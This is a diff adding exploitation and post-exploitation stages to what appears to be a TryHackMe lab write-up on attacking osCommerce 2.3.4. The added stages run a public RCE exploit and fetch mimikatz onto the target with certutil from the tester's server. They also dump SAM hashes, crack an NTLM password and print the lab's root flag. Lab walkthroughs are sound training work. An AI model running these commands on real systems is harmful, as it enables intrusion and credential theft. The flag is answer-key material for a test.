@@ -70,3 +70,99 @@ After discovering the **osCommerce 2.3.4** installation during the enumeration p
 
 **Assessment Conclusion:** 
 The application has not been patched against critical RCE vulnerabilities. I will proceed to the Exploitation phase utilizing the `44374.py` exploit to achieve remote code execution.
+
+
+## Stage 3: Exploitation ##
+
+• Using a publicly available exploit from [GitHub](https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution/blob/main/osCommerce2_3_4RCE.py) targeting osCommerce 2.3.4, remote command execution was:
+
+```bash
+python3 osCommerce2_3_4RCE.py http://10.49.151.74:8080/oscommerce-2.3.4/catalog
+```
+
+• The script confirmed that the install directory was available, indicating vulnerability. A test command injection returned the user context as:
+
+```bash
+User: nt authority\system
+```
+
+This demonstrated that commands could be executed on the host with SYSTEM privileges.
+
+image
+
+## Stage 4: Post-Exploitation (Maintaining Access & Privilege Escalation) ##
+
+Once inside, I explores the system, gathers sensitive data, and attempts to secure my foothold. (Because the author already had SYSTEM privileges, I skipped Privilege Escalation and moved straight to credential harvesting).
+
+I use `mimicatz.exe` as it's an open-source post-exploitation and credential-dumping tool.
+
+First, I download `mimikatz.exe` at [mimikatz.exe](https://github.com/ParrotSec/mimikatz/blob/master/Win32/mimikatz.exe)
+
+After that, I setup my server so that `mimikatz.exe` can be fetched by using:
+
+```bash
+python3 -m http.server 8000
+```
+image
+
+The status **200** tells that `mimikatz.exe` is successfully fetched.
+
+Next on the `RCE_SHELL$`:
+
+```bash
+certutil -urlcache -split -f http://192.168.206.94:8000/mimikatz.exe mimikatz.exe
+```
+
+image
+
+This command is a classic example of using a "Living off the Land Binary" (LOLBin). A LOLBin is a legitimate, pre-installed operating system tool that attackers (or penetration testers) abuse to perform actions they normally wouldn't be able to do easily, such as downloading malicious payloads without needing a dedicated web browser or custom download script.
+
+```bash
+****  Online  ****
+  000000  ...
+  0f2f08
+CertUtil: -URLCache command completed successfully.
+```
+It confirms that the Windows target machine successfully reached out to my hosting server and downloaded my file.
+
+```bash
+.\mimikatz "lsadump::sam" exit
+```
+
+image
+
+• `.\mimikatz`
+This tells the Windows command prompt to execute the mimikatz.exe application located in your current directory (the .\ specifies "right here in this folder").
+
+• `"lsadump::sam"`
+This is the specific instruction you are passing to Mimikatz.
+
+   • lsadump is the Mimikatz module used to interact with Windows security and credential structures.
+
+• `sam` targets the Security Account Manager (SAM) database. The SAM is a registry file in Windows that stores local user accounts and their passwords (stored as NTLM hashes, not plain text). This command extracts the System Key (SysKey) to decrypt the SAM database and print those hashes to your screen.
+
+• `exit`
+This final argument tells Mimikatz to terminate and return you to the standard Windows command prompt immediately after it finishes dumping the hashes.
+
+**Cracking the Lab User NTLM Hash**
+
+Using an online hash cracking service (hashes.com), the Lab user's NTLM hash was decrypted revealing the password:
+
+Hash: 30e87bf999828446a1c1209ddde4c450
+Password: googleplus
+
+image
+
+**Capturing the Root Flag**
+
+Finally, using system commands, the root flag file was read:
+
+```bash
+type C:\Users\Administrator\Desktop\root.txt.txt
+```
+FLAG : THM{aea1e3ce6fe7f89e10cea833ae009bee}
+
+image
+
+## Stage 5 : Clear Track ##
+
